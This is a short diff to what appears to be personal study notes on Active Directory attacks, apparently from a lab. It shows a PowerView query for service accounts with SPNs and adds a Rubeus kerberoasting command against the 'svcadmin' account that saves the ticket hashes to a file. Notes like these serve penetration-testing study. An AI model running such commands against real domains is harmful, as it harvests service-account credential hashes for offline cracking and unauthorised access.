@@ -589,4 +589,7 @@ Import powerview and use it to search for spn accounts
 Get-DomainUser -SPN
 ```
 ![[Pasted image 20231025153253.png]]
-We can kerberoast it 
+We try to kerberoast it 
+
+C:\AD\Tools\Rubeus.exe kerberoast /user:svcadmin /simple 
+/rc4opsec /outfile:C:\AD\Tools\hashes.txt
